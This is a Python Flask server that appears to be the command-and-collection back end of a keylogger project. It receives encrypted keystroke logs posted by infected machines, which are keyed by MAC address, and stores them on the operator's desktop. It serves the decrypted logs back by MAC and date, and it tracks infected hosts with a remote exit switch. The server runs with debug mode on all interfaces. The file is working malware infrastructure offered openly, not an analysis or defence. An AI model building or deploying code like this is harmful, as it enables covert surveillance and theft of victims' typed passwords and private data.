from flask import Flask, render_template, Blueprint, jsonify, request
import requests
import json
import time
from flask_cors import CORS
from getmac import get_mac_address

from KEYLOGGER_PROJECT.Encrypt_Decrypt.decrypt_file import Decrypt



with open(r'C:\Users\User\Desktop/keylogger_data/Mac_status.json', 'w') as f:
    json.dump({'flask':True}, f)


app = Flask(__name__)
CORS(app)


@app.route('/', methods=['GET'])
def hello():
    mac_address = request.args['mac']
    date_input = request.args['date']
    with open(fr"C:\Users\User\Desktop\{mac_address.replace(':','-')}.json", 'rb') as f:
        try:
            key=Decrypt.get_key(mac_address)
            dic = dict(Decrypt.decrypt_data(f.read(), key))[mac_address][date_input]
            return str(dic)
        except Exception as e:
            return jsonify({'invalid mac address': e})


@app.route('/add_data', methods=['POST'])
def add_data():
    dict_data = dict(request.json)
    data = dict_data['data'].encode()
    mac = dict_data['mac']
    try:
        with open(fr'C:\Users\User\Desktop\keylogger_data\{mac.replace(':', '-')}.json', 'ab') as f:
            f.write(data)
            return jsonify({'post':'successful','if exit':'False'}), 200
    except Exception as e:
        print(e)


@app.route('/send_mac', methods=['POST'])
def send_mac():
    mac = request.data
    try:
        with open(r'C:\Users\User\Desktop/keylogger_data/Mac_status.json', 'r') as f:
            dict_f = json.loads(f.read())
            dict_f[mac.decode()] = True
            with open(r'C:\Users\User\Desktop/keylogger_data/Mac_status.json', 'w') as file:
                json.dump(dict_f, file)
        return jsonify({'post':'successful'}), 200
    except Exception as e:
        print(e)


@app.route('/check_status', methods=['GET'])
def check_status():
    mac = request.args.get('mac')
    try:
        with open(r'C:\Users\User\Desktop/keylogger_data/Mac_status.json', 'r') as f:
            dic_status = json.loads(f.read())
            if dic_status[mac] == False:
                return jsonify({'exit':True}), 400
        return jsonify({'exit':False}), 200
    except Exception as e:
        # print(e)
        pass
    return jsonify({'exit': False}), 200




app.run(debug=True, host='0.0.0.0')